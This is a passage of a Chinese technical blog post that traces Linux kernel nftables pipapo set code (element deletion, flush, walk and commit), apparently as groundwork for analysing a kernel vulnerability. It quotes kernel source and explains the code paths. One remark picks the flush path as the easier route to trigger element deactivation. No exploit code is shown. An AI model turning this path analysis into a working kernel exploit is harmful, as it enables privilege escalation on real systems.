class="keyword">if</span> (!<span class="built_in">set</span>-&gt;ops-&gt;commit)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;commit(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后这里又一次会调用ops中的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_pipapo_commit</span><span class="params">(<span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo</span> *<span class="title">priv</span> =</span> nft_set_priv(<span class="built_in">set</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> *<span class="title">new_clone</span>, *<span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (time_after_eq(jiffies, priv-&gt;last_gc + nft_set_gc_interval(<span class="built_in">set</span>)))</span><br><span class="line">pipapo_gc(<span class="built_in">set</span>, priv-&gt;clone);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!priv-&gt;dirty)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">new_clone = pipapo_clone(priv-&gt;clone);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(new_clone))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">priv-&gt;dirty = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">old = rcu_access_pointer(priv-&gt;match);</span><br><span class="line">rcu_assign_pointer(priv-&gt;match, priv-&gt;clone);</span><br><span class="line"><span class="keyword">if</span> (old)</span><br><span class="line">call_rcu(&amp;old-&gt;rcu, pipapo_reclaim_match);</span><br><span class="line"></span><br><span class="line">priv-&gt;clone = new_clone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里主要干的事就是将clone移到match成员上，最后调用<code>pipapo_reclaim_match</code>去free掉clone成员。</p><h3 id="nft-del-setelem"><a href="#nft-del-setelem" class="headerlink" title="nft_del_setelem"></a>nft_del_setelem</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_del_setelem</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>[<span class="title">NFTA_SET_ELEM_MAX</span> + 1];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext_tmpl</span> <span class="title">tmpl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_elem</span> <span class="title">elem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(nla, NFTA_SET_ELEM_MAX, attr,</span><br><span class="line">  nft_set_elem_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err = nft_setelem_parse_flags(<span class="built_in">set</span>, nla[NFTA_SET_ELEM_FLAGS], &amp;flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nla[NFTA_SET_ELEM_KEY] &amp;&amp; !(flags &amp; NFT_SET_ELEM_CATCHALL))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nft_setelem_valid_key_end(<span class="built_in">set</span>, nla, flags))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">nft_set_ext_prepare(&amp;tmpl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span>) &#123;</span><br><span class="line">err = nft_set_ext_add(&amp;tmpl, NFT_SET_EXT_FLAGS);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY]) &#123;</span><br><span class="line">err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key.val,</span><br><span class="line">    nla[NFTA_SET_ELEM_KEY]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err = nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> fail_elem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY_END]) &#123;</span><br><span class="line">err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key_end.val,</span><br><span class="line">    nla[NFTA_SET_ELEM_KEY_END]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> fail_elem;</span><br><span class="line"></span><br><span class="line">err = nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY_END, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> fail_elem_key_end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">elem.priv = nft_set_elem_init(<span class="built_in">set</span>, &amp;tmpl, elem.key.val.data,</span><br><span class="line">      elem.key_end.val.data, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">      GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(elem.priv)) &#123;</span><br><span class="line">err = PTR_ERR(elem.priv);</span><br><span class="line"><span class="keyword">goto</span> fail_elem_key_end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ext = nft_set_elem_ext(<span class="built_in">set</span>, elem.priv);</span><br><span class="line"><span class="keyword">if</span> (flags)</span><br><span class="line">*nft_set_ext_flags(ext) = flags;</span><br><span class="line"></span><br><span class="line">trans = nft_trans_elem_alloc(ctx, NFT_MSG_DELSETELEM, <span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (trans == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> fail_trans;</span><br><span class="line"></span><br><span class="line">err = nft_setelem_deactivate(ctx-&gt;net, <span class="built_in">set</span>, &amp;elem, flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> fail_ops;</span><br><span class="line"></span><br><span class="line">nft_setelem_data_deactivate(ctx-&gt;net, <span class="built_in">set</span>, &amp;elem);</span><br><span class="line"></span><br><span class="line">nft_trans_elem(trans) = elem;</span><br><span class="line">nft_trans_commit_list_add_tail(ctx-&gt;net, trans);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail_ops:</span><br><span class="line">kfree(trans);</span><br><span class="line">fail_trans:</span><br><span class="line">kfree(elem.priv);</span><br><span class="line">fail_elem_key_end:</span><br><span class="line">nft_data_release(&amp;elem.key_end.val, NFT_DATA_VALUE);</span><br><span class="line">fail_elem:</span><br><span class="line">nft_data_release(&amp;elem.key.val, NFT_DATA_VALUE);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里和add有点子像，也是会在nla中拿值只是没那么多，这里会取出key和key_end来和已存在的进行比较。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_set_flush</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>, u8 genmask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_iter</span> <span class="title">iter</span> =</span> &#123;</span><br><span class="line">.genmask= genmask,</span><br><span class="line">.fn= nft_setelem_flush,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;walk(ctx, <span class="built_in">set</span>, &amp;iter);</span><br><span class="line"><span class="keyword">if</span> (!iter.err)</span><br><span class="line">iter.err = nft_set_catchall_flush(ctx, <span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> iter.err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_delsetelem</span><span class="params">(struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">int</span> rem, err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_SET_ELEM_LIST_TABLE], family,</span><br><span class="line"> genmask, NETLINK_CB(skb).portid);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_ELEM_LIST_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup(table, nla[NFTA_SET_ELEM_LIST_SET], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp;</span><br><span class="line">    (<span class="built_in">set</span>-&gt;flags &amp; (NFT_SET_CONSTANT | NFT_SET_ANONYMOUS)))</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nla[NFTA_SET_ELEM_LIST_ELEMENTS])</span><br><span class="line"><span class="keyword">return</span> nft_set_flush(&amp;ctx, <span class="built_in">set</span>, genmask);</span><br><span class="line"></span><br><span class="line">nla_for_each_nested(attr, nla[NFTA_SET_ELEM_LIST_ELEMENTS], rem) &#123;</span><br><span class="line">err = nft_del_setelem(&amp;ctx, <span class="built_in">set</span>, attr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这里也可以选择直接偷懒不设置<code>NFTA_SET_ELEM_LIST_ELEMENTS</code>然后走<code>nft_set_flush</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_set_flush</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>, u8 genmask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_iter</span> <span class="title">iter</span> =</span> &#123;</span><br><span class="line">.genmask= genmask,</span><br><span class="line">.fn= nft_setelem_flush,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;walk(ctx, <span class="built_in">set</span>, &amp;iter);</span><br><span class="line"><span class="keyword">if</span> (!iter.err)</span><br><span class="line">iter.err = nft_set_catchall_flush(ctx, <span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> iter.err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会直接调用<code>set-&gt;ops-&gt;walk</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_pipapo_walk</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct nft_set_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo</span> *<span class="title">priv</span> =</span> nft_set_priv(<span class="built_in">set</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> read_pnet(&amp;<span class="built_in">set</span>-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_match</span> *<span class="title">m</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_field</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> i, r;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line"><span class="keyword">if</span> (iter-&gt;genmask == nft_genmask_cur(net))</span><br><span class="line">m = rcu_dereference(priv-&gt;match);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">m = priv-&gt;clone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!m))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, f = m-&gt;f; i &lt; m-&gt;field_count - <span class="number">1</span>; i++, f++)</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; f-&gt;rules; r++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_elem</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_elem</span> <span class="title">elem</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r &lt; f-&gt;rules - <span class="number">1</span> &amp;&amp; f-&gt;mt[r + <span class="number">1</span>].e == f-&gt;mt[r].e)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iter-&gt;count &lt; iter-&gt;skip)</span><br><span class="line"><span class="keyword">goto</span> cont;</span><br><span class="line"></span><br><span class="line">e = f-&gt;mt[r].e;</span><br><span class="line"><span class="keyword">if</span> (nft_set_elem_expired(&amp;e-&gt;ext))</span><br><span class="line"><span class="keyword">goto</span> cont;</span><br><span class="line"></span><br><span class="line">elem.priv = e;</span><br><span class="line"></span><br><span class="line">iter-&gt;err = iter-&gt;fn(ctx, <span class="built_in">set</span>, iter, &amp;elem);</span><br><span class="line"><span class="keyword">if</span> (iter-&gt;err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">cont:</span><br><span class="line">iter-&gt;count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合前面的分析可以清晰的看到这里会拿到element给到<code>elem.priv</code>。最后调用<code>iter-&gt;fn</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_setelem_flush</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nft_set_iter *iter,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_set_elem *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">trans = nft_trans_alloc_gfp(ctx, NFT_MSG_DELSETELEM,</span><br><span class="line">    <span class="keyword">sizeof</span>(struct nft_trans_elem), GFP_ATOMIC);</span><br><span class="line"><span class="keyword">if</span> (!trans)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>-&gt;ops-&gt;flush(ctx-&gt;net, <span class="built_in">set</span>, elem-&gt;priv)) &#123;</span><br><span class="line">err = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>-&gt;ndeact++;</span><br><span class="line"></span><br><span class="line">nft_setelem_data_deactivate(ctx-&gt;net, <span class="built_in">set</span>, elem);</span><br><span class="line">nft_trans_elem_set(trans) = <span class="built_in">set</span>;</span><br><span class="line">nft_trans_elem(trans) = *elem;</span><br><span class="line">nft_trans_commit_list_add_tail(ctx-&gt;net, trans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err1:</span><br><span class="line">kfree(trans);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里大部分就不用多提，就是创建trans准备commit，这里有个对<code>set-&gt;ops-&gt;flush</code>的判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_pipapo_activate</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nft_set_elem *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_elem</span> *<span class="title">e</span>;</span></span><br><span class="line"></span><br><span class="line">e = pipapo_get(net, <span class="built_in">set</span>, (<span class="keyword">const</span> u8 *)elem-&gt;key.val.data, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(e))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">nft_set_elem_change_active(net, <span class="built_in">set</span>, &amp;e-&gt;ext);</span><br><span class="line">nft_set_elem_clear_busy(&amp;e-&gt;ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">nft_pipapo_flush</span><span class="params">(<span class="keyword">const</span> struct net *net, <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">void</span> *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_pipapo_elem</span> *<span class="title">e</span> =</span> elem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pipapo_deactivate(net, <span class="built_in">set</span>, (<span class="keyword">const</span> u8 *)nft_set_ext_key(&amp;e-&gt;ext),</span><br><span class="line"> &amp;e-&gt;ext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会修改element的活跃状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> NFT_MSG_DELSETELEM:</span><br><span class="line">        te = (struct nft_trans_elem *)trans-&gt;data;</span><br><span class="line"></span><br><span class="line">        nf_tables_setelem_notify(&amp;trans-&gt;ctx, te-&gt;<span class="built_in">set</span>,</span><br><span class="line">                     &amp;te-&gt;elem,</span><br><span class="line">                     NFT_MSG_DELSETELEM);</span><br><span class="line">        nft_setelem_remove(net, te-&gt;<span class="built_in">set</span>, &amp;te-&gt;elem);</span><br><span class="line">        <span class="keyword">if</span> (!nft_setelem_is_catchall(te-&gt;<span class="built_in">set</span>, &amp;te-&gt;elem)) &#123;</span><br><span class="line">            atomic_dec(&amp;te-&gt;<span class="built_in">set</span>-&gt;nelems);</span><br><span class="line">            te-&gt;<span class="built_in">set</span>-&gt;ndeact--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (te-&gt;<span class="built_in">set</span>-&gt;ops-&gt;commit &amp;&amp;</span><br><span class="line">            list_empty(&amp;te-&gt;<span class="built_in">set</span>-&gt;pending_update)) &#123;</span><br><span class="line">            list_add_tail(&amp;te-&gt;<span class="built_in">set</span>-&gt;pending_update,</span><br><span class="line">                      &amp;set_update_list);</span><br><span class="line">        